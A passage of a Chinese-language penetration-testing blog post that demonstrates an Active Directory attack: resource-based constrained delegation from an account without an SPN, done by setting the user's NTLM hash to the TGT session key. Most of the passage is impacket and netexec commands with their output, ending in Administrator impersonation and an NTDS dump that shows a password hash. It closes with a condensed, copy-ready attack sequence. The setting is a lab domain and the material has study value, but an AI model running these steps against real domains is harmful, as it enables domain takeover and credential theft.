+</h3><p>当我们发起S4U2Proxy请求时KDC会执行如下操作，kdc首先需要检查我们提供的S4U2Self服务票据，也就是刚才我们成功过绕过的票据，kdc会尝试解密这个票据来验证其有效性。</p>
+<p>kdc校验PAC（Privilege Attribute Certificate）里的签名：</p>
+<ol>
+<li>Server Signature：用服务票据的 session key 加 HMAC。</li>
+<li>KDC Signature：用 KDC 的主密钥加 HMAC。</li>
+</ol>
+<p>这里的session_key是在请求之前利用我们指定长期密钥加密的一串随机密钥，格式为aes或者rc4，解密过程kdc也会需要去寻找提交用户的spn进行解密，当它发现我们没有spn的时候就会退回并尝试使用用户长期密钥，这就导致了失败认证。</p>
+<p>听着有点复杂，但是简单能浓缩成两句话：</p>
+<ol>
+<li>正常流程：KDC 找到 SPN → 用服务长期密钥解密 PAC → 成功。</li>
+<li>普通用户没有 SPN：KDC fallback 用用户长期密钥 → 与 PAC 加密 key 不符 → 失败。</li>
+</ol>
+<p>这里的绕过思路就是让用户长期密钥与pac加密key相符，，但是我们没有办法直接修改pac，因为在我们拥有密钥的情况下虽然可以修改Server Signature但是我们并修改不了KDC Signature，它是使用KDC自己的密钥密钥的HMAC。我们不知道此密钥，也就没办法修改，所以我们只能另辟蹊径，尝试让此域用户的长期密钥直接等于session key就可以理论上绕过这个限制</p>
+<p>为了获取sessionkey，我们需要以用户身份远程请求tgt并解密查看</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ rm mrrobot.ccache 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-getTGT $domain/$user:$pass -dc-ip $ip
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in mrrobot.ccache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-describeTicket mrrobot.ccache 
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Number of credentials in cache: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Parsing credential<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ticket Session Key            : fb6f9d587e3b8c08a0390e82a3c9fa4d281088835c3bd631712bd99c42246bb2
+</span></span><span style="display:flex;"><span>.............
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   Encryption type             : aes256_cts_hmac_sha1_96 <span style="color:#f92672">(</span>etype 18<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 <span style="color:#f92672">(</span>etype 18<span style="color:#f92672">)</span>, but no keys/creds were supplied
+</span></span></code></pre></div><p>这里可以看到我们利用密码请求了一个tgt，解密后获得的session key为</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>fb6f9d587e3b8c08a0390e82a3c9fa4d281088835c3bd631712bd99c42246bb2
+</span></span></code></pre></div><p>这个长度明显是用aes加密而成，我们需要将用户的hash直接更改为此session key是很困难的，由于ntlmhash是rc4加密过程，这个就是0xdf文章当中未提到的，我们整套攻击流程显然都需要目标开启rc4认证，但一般域虽然默认开启，却不会默认使用rc4，pha那台靶机是不仅启用，也默认使用了rc4加密，所以才允许用密码请求tgt获取到了rc4加密的session key，这里解决办法也很简单，只需要我们以hash请求即可，以ntlmhash请求tgt就会使kdc默认使用rc4进行加密session key</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ iconv -f ASCII -t UTF-16LE &lt;<span style="color:#f92672">(</span>printf <span style="color:#e6db74">&#34;mrroboto12&#34;</span><span style="color:#f92672">)</span> | openssl dgst -md4
+</span></span><span style="display:flex;"><span>MD4<span style="color:#f92672">(</span>stdin<span style="color:#f92672">)=</span> c8fa8686516464c51cfc0bdc3e52ef9e
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-getTGT $domain/$user -hashes :$hash -dc-ip $ip
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in mrrobot.ccache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-describeTicket mrrobot.ccache 
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Number of credentials in cache: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Parsing credential<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ticket Session Key            : fce9e6a3381a5301dd00d59aaae12af6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> User Name                     : mrrobot
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> User Realm                    : NOVICE.COM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service Name                  : krbtgt/NOVICE.COM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service Realm                 : NOVICE.COM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Start Time                    : 23/08/2025 01:33:38 AM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> End Time                      : 23/08/2025 11:33:38 AM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> RenewTill                     : 24/08/2025 01:33:38 AM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Flags                         : <span style="color:#f92672">(</span>0x50c10000<span style="color:#f92672">)</span> forwardable, proxiable, renewable, initial, enc_pa_rep
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KeyType                       : rc4_hmac
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Base64<span style="color:#f92672">(</span>key<span style="color:#f92672">)</span>                   : /OnmozgaUwHdANWaquEq9g<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Decoding unencrypted data in credential<span style="color:#f92672">[</span>0<span style="color:#f92672">][</span><span style="color:#e6db74">&#39;ticket&#39;</span><span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   Service Name                : krbtgt/NOVICE.COM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   Service Realm               : NOVICE.COM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   Encryption type             : aes256_cts_hmac_sha1_96 <span style="color:#f92672">(</span>etype 18<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 <span style="color:#f92672">(</span>etype 18<span style="color:#f92672">)</span>, but no keys/creds were supplied
+</span></span></code></pre></div><p>可以看到这次session key是rc4格式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>fce9e6a3381a5301dd00d59aaae12af6
+</span></span></code></pre></div><p>完全符合了ntlm的格式，所以我们可以将此域用户的ntlm直接修改为session key</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-changepasswd -newhashes :fce9e6a3381a5301dd00d59aaae12af6 $domain/$user:$pass@DC.novice.com -dc-ip $ip
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Changing the password of novice.com<span style="color:#ae81ff">\m</span>rrobot
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to DCE/RPC as novice.com<span style="color:#ae81ff">\m</span>rrobot
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Password was changed successfully.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> User will need to change their password on next logging because we are using hashes.
+</span></span></code></pre></div><p>注意这一步是自毁式攻击，如果攻击失败，无法获得高权限的情况下，此用户会失效（因为我们改了它的hash，应用于hash认证的手段还是正常的，但是噪音会比较大）</p>
+<p>当修改完毕后，我们会发现攻击成功了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ KRB5CCNAME<span style="color:#f92672">=</span>mrrobot.ccache impacket-getST -u2u -impersonate Administrator -spn cifs/DC.novice.com $domain/$user -k -no-pass
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Impersonating Administrator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2self+U2U
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrator@cifs_DC.novice.com@NOVICE.COM.ccache
+</span></span></code></pre></div><p>票据也是可以利用的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ KRB5CCNAME<span style="color:#f92672">=</span>Administrator@cifs_DC.novice.com@NOVICE.COM.ccache netexec smb $ip --use-kcache --ntds --user Administrator
+</span></span><span style="display:flex;"><span>SMB         192.168.174.145 <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:novice.com<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.174.145 <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> novice.com<span style="color:#ae81ff">\A</span>dministrator from ccache <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.174.145 <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumping the NTDS, this could take a <span style="color:#66d9ef">while</span> so go grab a redbull...
+</span></span><span style="display:flex;"><span>SMB         192.168.174.145 <span style="color:#ae81ff">445</span>    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34:::
+</span></span></code></pre></div><p>这就是全部的流程了</p>
+<h2 id="攻击导致的结果以及需要的条件">攻击导致的结果以及需要的条件
+</h2><ol>
+<li>需要域启用rc4</li>
+<li>需要用户的密码或者hash，只有票据的情况下无法攻击</li>
+<li>使用用户会牺牲，之后可能很难使用密码登录。</li>
+<li>噪音比较大，容易被安全审查发现</li>
+</ol>
+<h2 id="快速攻击流程">快速攻击流程
+</h2><p>首先确定此用户确实对目标有rbcd（allowtoacl）权限，没有的话利用权限写入一个</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-rbcd -action write -delegate-to <span style="color:#e6db74">&#34;target</span>$<span style="color:#e6db74">&#34;</span> -delegate-from <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> $domain/$user -hashes :$ntlm -dc-ip $ip
+</span></span><span style="display:flex;"><span>或者
+</span></span><span style="display:flex;"><span>impacket-rbcd -action write -delegate-to <span style="color:#e6db74">&#34;target</span>$<span style="color:#e6db74">&#34;</span> -delegate-from <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> $domain/$user:$pass -dc-ip $ip
+</span></span></code></pre></div><p>之后利用hash请求域用户tgt（必须利用hash，要不然后续session_key加密不一定是rc4加密，无法攻击，如果是密码，请先转换为hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e">#将密码转换为hash</span>
+</span></span><span style="display:flex;"><span>iconv -f ASCII -t UTF-16LE &lt;<span style="color:#f92672">(</span>printf <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> | openssl dgst -md4
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#请求tgt</span>
+</span></span><span style="display:flex;"><span>impacket-getTGT $domain/$user -hashes :$hash -dc-ip $ip
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#验证tgt是否是rc4加密session_key</span>
+</span></span><span style="display:flex;"><span>impacket-describeTicket $user.ccache 
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Number of credentials in cache: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Parsing credential<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ticket Session Key            : c6427e4b47c680c7017571327c141b95
+</span></span><span style="display:flex;"><span>...............
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#当看到tgt的session_key是ntlm格式而不是aes长段格式。这一步就成功了</span>
+</span></span></code></pre></div><p>请求完毕后，将此改此用户hash等于session_key</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-changepasswd -newhashes :c6427e4b47c680c7017571327c141b95 $domain/$user:$pass@$FQDN -dc-ip $ip
+</span></span></code></pre></div><p>修改成功后，就能正常利用域用户进行rbcd</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>KRB5CCNAME<span style="color:#f92672">=</span>$user.ccache impacket-getST -u2u -impersonate Administrator -spn cifs/$FQDN $domain/$user -k -no-pass
+</span></span></code></pre></div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/">域之魔法</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">血缇之书</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 wackymaker
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
